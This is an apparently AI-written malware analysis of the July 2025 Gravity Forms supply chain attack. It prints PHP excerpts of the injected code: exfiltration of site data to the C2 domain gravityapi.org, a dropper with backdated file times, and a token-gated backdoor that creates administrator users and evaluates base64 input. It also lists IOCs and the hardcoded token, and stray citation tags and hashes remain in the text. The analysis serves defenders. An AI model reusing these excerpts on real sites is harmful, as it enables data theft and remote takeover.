Overview of the Malicious Functions in the Gravity Forms Supply Chain Attack
In the July 2025 supply chain attack on Gravity Forms, attackers injected malicious code into the official plugin downloads (versions 2.9.11.1, 2.9.12, and Composer installs of 2.9.11 during July 10-11). The primary affected files were gravityforms/common.php and includes/settings/class-settings.php (with triggers via notification.php). The malware enabled data exfiltration, remote code execution (RCE), unauthorized user creation, and other operations. Below, I'll break down the key malicious functions step by step, based on their behavior, using code excerpts where available. The attack chain starts with initial exfiltration and payload deployment, leading to a persistent backdoor.
1. Initial Trigger and Data Exfiltration (Function: update_entry_detail in gravityforms/common.php)
This function is hooked into the plugin's loading process (via WordPress actions like plugins_loaded), allowing it to activate automatically upon plugin installation or site load without authentication. Its primary role is to collect sensitive site metadata and send it to a command-and-control (C2) server, while also handling responses to deploy further payloads.
Step 1.1: Collection of Site Metadata
The function gathers detailed information about the WordPress installation, including the site URL, name, admin URL, WP and PHP versions, active theme, list of active plugins (JSON-encoded), server uname, user count, and timestamp. This data is packaged into an array for exfiltration.
Code excerpt:
$data = array(  
    'site_url' => get_site_url(),  
    'site_name' => get_bloginfo('name'),  
    'admin_url' => admin_url(),  
    'wp_version' => get_bloginfo('version'),  
    'php_version' => phpversion(),  
    'active_theme' => wp_get_theme()->get('Name'),  
    'active_plugins' => json_encode($plugin_list),  
    'uname' => php_uname(),  
    'users_count' => $user_count,  
    'timestamp' => current_time('mysql')  
);
This step reconnaissance helps attackers identify valuable targets (e.g., high-traffic sites or those with specific plugins for further exploitation).c8cdb23e02af
Step 1.2: Exfiltration via POST Request
The collected data is sent as a blocking POST request to the C2 domain https://gravityapi.org/sites (registered July 8, 2025). The request uses WordPress's wp_remote_post with a 25-second timeout to ensure delivery.
Code excerpt:
$request = wp_remote_post($gf_url, array(  
    'method' => 'POST',  
    'timeout' => 25,  
    'blocking' => true,  
    'body' => $data,  
));
If successful (HTTP 200), the response is processed. This exfiltration occurs unauthenticated, making it stealthy and immediate upon infection.2f24b9d31ce3a40b02
Step 1.3: Payload Download and File Writing
The C2 response is JSON-decoded. If it contains a filename (gf_name) and base64-encoded content (body), the function creates the directory if needed, writes the decoded content to a file (often wp-includes/bookmark-canonical.php to blend in with core WP files), and sets a backdated timestamp (e.g., -2 months) to evade detection by file scanners.
Code excerpt:
if (!is_wp_error($request) && wp_remote_retrieve_response_code($request) == 200) {  
    $response = json_decode(wp_remote_retrieve_body($request), true);  
    if (isset($response['gf_name'])) {  
        $touch_time = filemtime(ABSPATH . "wp-content/plugins/index.php");  
        if ($touch_time === false) {  
            $touch_time = strtotime('-2 months');  
        }  
        $gf_path = ABSPATH . $response['gf_name'];  
        $gf_dir = dirname($gf_path);  
        if (!file_exists($gf_dir)) {  
            mkdir($gf_dir, 0755, true);  
        }  
        if (!file_exists($gf_path)) {  
            file_put_contents($gf_path, base64_decode($response['body']));  
            touch($gf_path, $touch_time);  
        }  
    }  
}
This deploys a secondary payload masquerading as legitimate WP code (e.g., "Content Management Tools"), which includes functions like handle_posts(), handle_media(), and handle_widgets() for RCE via eval on user-supplied input. The chain is __construct() -> init_content_management() -> handle_requests() -> process_request(), allowing unauthenticated access.bd457ede9a0b
2. Backdoor Operations (Function: list_sections in includes/settings/class-settings.php, Triggered via notification.php)
This function acts as the main backdoor, requiring a hardcoded token for authentication. It's called via GET/POST parameters in requests to notification.php, enabling persistent control post-infection. It supports multiple malicious actions via a switch statement.
Step 2.1: Token Validation
The function checks for $_REQUEST['gf_api_token'] matching the hardcoded value Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3. If invalid, it exits early. This prevents casual discovery while allowing attackers with the token full access.
Code excerpt:
if (!isset($_REQUEST['gf_api_token'])) {  
    return;  
}  
$secret_key = $_REQUEST['gf_api_token'];  
if ($secret_key !== 'Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3') {  
    return;  
}  
```<grok:render card_id="5f2a64" card_type="citation_card" type="render_inline_citation">
16 </grok:render>
Step 2.2: Action Handling via Switch Cases
Based on a parameter like $gf_action (from request), it executes various operations:
User Creation (cusr): Creates an admin user with supplied username, password, and email, then assigns the 'administrator' role. Outputs JSON success.
Code excerpt:
case 'cusr':  
    $username = $_REQUEST['gf_username'];  
    $password = $_REQUEST['gf_password'];  
    $email = $_REQUEST['gf_email'];  
    $user_id = wp_create_user($username, $password, $email);  
    $user = get_user_by('id', $user_id);  
    $user->set_role('administrator');  
    echo json_encode(array('success' => true, 'user_id' => $user_id));  
    die();
This grants persistent access without needing RCE for login.2e0619c0c385
Remote Code Execution (formula): Decodes base64 input from $_REQUEST['gf_formula'], evaluates it via eval (capturing output with output buffering), and outputs the result. This allows arbitrary PHP execution.
Code excerpt:
case 'formula':  
    $gf_formula = $_REQUEST['gf_formula'];  
    ob_start();  
    eval(base64_decode($gf_formula));  
    $gf_result = ob_get_clean();  
    die($gf_result);
Enables shell-like control, e.g., file uploads, deletions, or further infections.0779696b6098
Other Actions: Includes file uploads (upload_file), user listing/deletion (lusr, dusr), and directory listing (ldir), facilitating reconnaissance and cleanup.
Step 2.3: Additional Behaviors
The malware blocks plugin updates to maintain persistence and may fetch more payloads. Exploitation attempts were observed from IP 193.160.101.6 shortly after disclosure.987bdec72d72
Indicators of Compromise (IOCs)
Domains: gravityapi.org (C2, suspended July 11).
Files: gravityforms/common.php, includes/settings/class-settings.php, wp-includes/bookmark-canonical.php.
Token: Cx3VGSwAHkB9yzIL9Qi48IFHwKm4sQ6Te5odNtBYu6Asb9JX06KYAWmrfPtG1eP3.
Behaviors: Unauthorized POSTs to gravityapi.org/sites, new admin users, or eval-based executions.110902edf43f262934
To mitigate, update to 2.9.13+, scan for IOCs, and restore from pre-July 9 backups if infected.